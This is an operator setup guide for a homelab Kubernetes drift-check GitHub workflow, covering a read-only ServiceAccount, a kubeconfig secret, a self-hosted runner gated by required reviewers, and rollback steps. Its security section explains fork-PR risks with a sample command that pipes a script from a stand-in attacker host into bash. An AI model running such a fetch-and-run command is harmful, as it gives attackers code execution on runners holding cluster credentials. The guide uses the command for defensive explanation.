# k8s drift check — operator setup

One-time setup the operator must complete on the homelab before the
`.github/workflows/k8s-drift.yml` workflow produces a visible signal on
PRs. Until step 6 (`K8S_DRIFT_CHECK_ENABLED=true`) is done, the workflow
exits early with a "skipped" notice — it does not fail.

Scope: implements **Option 1 (advisory PR comment)** from issue #133.
The workflow runs `kubectl diff -f infra/k8s/` against the live homelab
cluster from a self-hosted runner and posts the diff as a sticky PR
comment. Advisory only — never blocks merge.

## Prerequisites

- Homelab k3s cluster reachable on the LAN (`ssh ridopark@192.168.10.123`).
- `kubectl` configured with cluster-admin on the homelab (one-shot setup only).
- A LAN host that can host a long-running self-hosted GitHub runner
  (the homelab host itself is fine).

## Steps

### 1. Apply the read-only ServiceAccount

```sh
kubectl apply -f infra/k8s/56-ci-readonly-sa.yaml
```

Creates `ServiceAccount/ci-drift-checker` in namespace `copytrade`, a
namespace-scoped `Role` + `RoleBinding` for all namespaced kinds, and a
minimal `ClusterRole` + `ClusterRoleBinding` for `namespaces` only. The SA
cannot mutate cluster state — `kubectl diff` only needs read.

Verify:

```sh
kubectl -n copytrade get sa ci-drift-checker
kubectl -n copytrade get role,rolebinding ci-drift-checker-readonly
kubectl get clusterrole,clusterrolebinding ci-drift-checker-readonly-cluster
```

### 2. Generate a long-lived kubeconfig for the SA

k3s ships with the legacy `ServiceAccount` token controller disabled by
default in newer versions; create a manually-managed token Secret bound
to the SA so the kubeconfig does not depend on a short-lived
projected token.

```sh
# Create a long-lived token secret bound to the SA.
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: ci-drift-checker-token
  namespace: copytrade
  annotations:
    kubernetes.io/service-account.name: ci-drift-checker
type: kubernetes.io/service-account-token
EOF

# Pull the token + CA bundle out and build the kubeconfig.
TOKEN=$(kubectl -n copytrade get secret ci-drift-checker-token -o jsonpath='{.data.token}' | base64 -d)
CA=$(kubectl -n copytrade get secret ci-drift-checker-token -o jsonpath='{.data.ca\.crt}')
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

cat > /tmp/kubeconfig-ci-drift-checker.yaml <<EOF
apiVersion: v1
kind: Config
clusters:
  - name: homelab
    cluster:
      server: ${SERVER}
      certificate-authority-data: ${CA}
contexts:
  - name: ci-drift-checker@homelab
    context:
      cluster: homelab
      user: ci-drift-checker
      namespace: copytrade
current-context: ci-drift-checker@homelab
users:
  - name: ci-drift-checker
    user:
      token: ${TOKEN}
EOF

# Smoke-test.
KUBECONFIG=/tmp/kubeconfig-ci-drift-checker.yaml kubectl auth can-i get configmaps -n copytrade
# Expected: yes
KUBECONFIG=/tmp/kubeconfig-ci-drift-checker.yaml kubectl auth can-i delete configmaps -n copytrade
# Expected: no
```

### 3. Configure the `production-drift-check` deployment environment

> Canonical source for this environment name is the `environment:` key in
> `.github/workflows/k8s-drift.yml`. If you rename it there, update every
> `production-drift-check` reference in this file too (the section
> heading, the verify command, the rollback command, and the
> Public-repo workflow safety subsection).

The workflow's `drift:` job declares `environment: production-drift-check`.
On a public repo with a self-hosted runner, this environment's
required-reviewer rule is the human gate that prevents fork PRs from
executing the diff job without operator approval. Set it up before
the runner registers in step 4 so the first run has somewhere to
pause.

1. In GitHub: **Settings → Environments → New environment**.
2. Name it exactly `production-drift-check` (must match the workflow).
3. Under **Deployment protection rules**, check **Required reviewers**
   and add yourself (the operator). Leave the wait timer at 0.
4. **Leave "Prevent self-review" UNCHECKED.** You are the sole reviewer
   on this repo — checking it would deadlock your own `infra/k8s/**`
   PRs. Fork PRs still require your explicit approval regardless of
   this setting.
5. Leave **Deployment branches** unrestricted — `pull_request_target`
   workflows always run from `main`, so branch restrictions add nothing.
6. Save.

Verify:

```sh
gh api repos/ridopark/oh-my-tradeagent/environments \
  --jq '.environments[] | select(.name == "production-drift-check") | {name, protection_rules: [.protection_rules[] | .type]}'
# Expected: { "name": "production-drift-check", "protection_rules": ["required_reviewers"] }
```

### 4. Register a self-hosted runner labeled `homelab`

GitHub Actions cannot reach the homelab from a hosted runner — the
homelab k3s API is LAN-only. Register a self-hosted runner on a LAN
host so the workflow can run `kubectl diff` against the live cluster.

1. In GitHub: **Settings → Actions → Runners → New self-hosted runner**.
2. Pick **Linux x64**. Follow the registration script GitHub shows.
3. When prompted for labels, add `homelab` (in addition to the defaults).
4. Run the runner as a systemd service (`./svc.sh install && ./svc.sh start`).
5. Install `kubectl` on the runner host:
   ```sh
   curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
   sudo install -m 0755 kubectl /usr/local/bin/kubectl
   ```

Verify the runner appears as **Idle** under Settings → Actions → Runners.

### 5. Add the kubeconfig as a repo secret

```sh
gh secret set KUBECONFIG_READONLY < /tmp/kubeconfig-ci-drift-checker.yaml
rm /tmp/kubeconfig-ci-drift-checker.yaml
```

### 6. Flip the enablement variable

The workflow's preflight job gates on `vars.K8S_DRIFT_CHECK_ENABLED ==
'true'`. Until this var is `true`, every run skips early with a friendly
notice. Flip it only after steps 1-5 are confirmed.

```sh
gh variable set K8S_DRIFT_CHECK_ENABLED --body "true"
```

### 7. Confirm on the next `infra/k8s/**` PR

The next PR that touches `infra/k8s/**` should:

- Trigger the **k8s drift check (advisory)** workflow.
- Run the preflight on GitHub-hosted infra.
- Pause the `kubectl diff` job with a yellow **"Review pending
  deployments"** banner on the PR (this is the `production-drift-check`
  environment's required-reviewer gate). Click **Approve and deploy**
  to release it to the self-hosted runner. For your own PRs this is
  a one-click confirmation; for any fork PR you should review the
  diff first.
- After approval: dispatch the diff job to the self-hosted runner.
- Post a comment starting with `### k8s drift check (advisory)` (or
  update it if the PR is pushed again).

If no comment appears, check the workflow run log under the **Actions**
tab — the preflight job's "Check K8S_DRIFT_CHECK_ENABLED" step prints a
GitHub `::notice` annotation explaining which gate fired.

## Rollback / disable

To turn the workflow back off without removing files:

```sh
gh variable set K8S_DRIFT_CHECK_ENABLED --body "false"
```

To fully remove:

```sh
gh secret delete KUBECONFIG_READONLY
gh variable delete K8S_DRIFT_CHECK_ENABLED
gh api -X DELETE repos/ridopark/oh-my-tradeagent/environments/production-drift-check
kubectl delete -f infra/k8s/56-ci-readonly-sa.yaml
kubectl -n copytrade delete secret ci-drift-checker-token
# Deregister the self-hosted runner from Settings → Actions → Runners.
```

### Security trade-offs

The SA's long-lived bearer token grants `namespaces` read cluster-wide (needed
for `kubectl diff` to walk namespace-scoped objects), but **cannot read any
Secret or ConfigMap outside the `copytrade` namespace**. If the token were
exfiltrated, the blast radius is limited to read access on `copytrade`-namespaced
resources plus the ability to enumerate namespace names cluster-wide.

This is a deliberate scope reduction from an earlier cluster-wide `ClusterRole`
that granted `secrets` read across every namespace (including `kube-system`),
which was flagged as a major security finding during the PR #134 review.

Short-lived tokens via `kubectl create token ci-drift-checker --duration=1h`
are a future hardening option. They were deferred to keep CI kubeconfig
plumbing simple — a long-lived token Secret avoids the need for a runner-side
token-refresh mechanism.

### Public-repo workflow safety

This repo is public. A self-hosted runner on a public repo is a classic
foot-gun: anyone can fork the repo, open a PR that edits the workflow
file (e.g. removes the preflight gate, adds `curl evil.com/x.sh | bash`),
and trigger arbitrary code execution on the runner as the `ridopark`
user — full LAN access, every Secret in the k3s cluster, the host
filesystem. To make a self-hosted runner safe here, the workflow has
three layered defenses:

1. **Trigger is `pull_request_target`, not `pull_request`.** Workflows
   triggered by `pull_request_target` always execute the workflow file
   as it exists on `main`, never the PR head's version. A fork PR
   cannot modify what the workflow does — they can only contribute
   manifest content under `infra/k8s/`. So the preflight gate, the
   environment requirement, the secret-handling — all stay enforceable
   regardless of what the PR diff looks like. (Workflow-file changes
   themselves are caught by normal PR review of `.github/workflows/**`
   before merge.)

2. **`drift:` job is bound to a required-reviewer environment.** The
   `environment: production-drift-check` declaration ties the job's
   execution to the environment configured in step 3, which requires
   the operator to click an "Approve and deploy" button before the
   runner picks the job up. Every fork-PR diff job pauses there until
   the operator inspects the PR diff.

3. **No PR-supplied script ever executes.** The only step that touches
   PR content is `kubectl diff -f infra/k8s/`, which parses the PR's
   YAML manifests as data and compares them to the cluster's live
   state. kubectl does not run anything from the manifests. The
   workflow never invokes `bash`, `make`, `npm install`, `pip install`,
   or any other command that would interpret PR-supplied scripts. If a
   future change adds such a command, the safety guarantee breaks —
   review `pull_request_target` workflow edits with that in mind.

   **This is why the diff noise filter is a heredoc.** The `drift:` job
   normalises `kubectl diff` output — dropping server-assigned metadata
   and pure list reordering — with a short Python program embedded in
   `k8s-drift.yml` as a heredoc. The obvious "cleanup" is to lift it
   into `scripts/normalize-k8s-diff.py` and call it. **Do not.**
   `pull_request_target` reads the workflow file from the base branch
   (trusted) but this job checks out `pull_request.head.sha`, so
   anything under `scripts/` in the working tree is attacker-controlled.
   `python3 scripts/<anything>` would hand any fork PR code execution on
   a LAN runner holding a cluster kubeconfig — turning the one defense
   in this section into a hole. The heredoc is read from the trusted
   workflow file and never from the checkout.

   The rigor normally bought by extracting-and-unit-testing is bought
   instead by `ci.yml`'s **k8s drift noise filter (mutation table)**
   step: `scripts/tests/test_k8s_drift_noise_filter.py` extracts that
   heredoc and runs a mutation suite against it (a value changed inside
   a reorder, an env var added, one dropped, a reorder across a `$(VAR)`
   expansion — each must still be reported). It runs on GitHub-hosted
   infra with no cluster access, and it tests the code that actually
   ships rather than a copy that could drift from it.

The combination is genuinely safe for read-only manifest validation.
If the workflow ever needs to execute PR-supplied code (run a test
suite, build an image), this design must be revisited — at that point
the right answer is probably a Tailscale tunnel from a GitHub-hosted
runner rather than a self-hosted runner on the LAN.

## Why advisory-only

Issue #133 explicitly chose Option 1 (advisory comment) over Option 2
(blocking check) and Option 3 (GitOps) for v0:

- Option 2 would block merges on transient cluster unreachability — the
  homelab is a single-node k3s host, so any reboot mid-PR would stall
  merges. Defer until multi-node or until reachability is more robust.
- Option 3 (GitOps via Flux/ArgoCD) inverts the deploy flow and is a
  much bigger change. Track as a separate issue when the operator is
  ready to give up the `kubectl apply` workflow.
